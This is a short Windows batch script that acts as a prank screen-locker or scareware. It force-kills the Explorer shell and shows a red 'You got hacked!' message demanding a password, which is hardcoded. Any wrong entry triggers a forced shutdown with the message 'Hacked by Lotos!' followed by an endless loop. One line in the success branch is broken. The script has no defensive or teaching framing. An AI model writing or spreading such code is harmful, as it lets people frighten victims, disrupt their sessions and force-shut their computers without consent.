@echo off

:kill_explorer
taskkill /f /im explorer.exe
cls
:news
color 4
echo You got hacked!
echo You only get free if you enter a Password!
:pass
echo Enter the Password
set/p "pass="
if NOT %pass%== LotosSafety goto bye_bye

:succes
cls
start explorer.exe
You got Free
goto end

:bye_bye
start explorer.exe
shutdown -s -t 3 /c "Hacked by Lotos!"
echo PC is shuting down in: 
timeout 3
goto wait

:wait
goto wait

:end
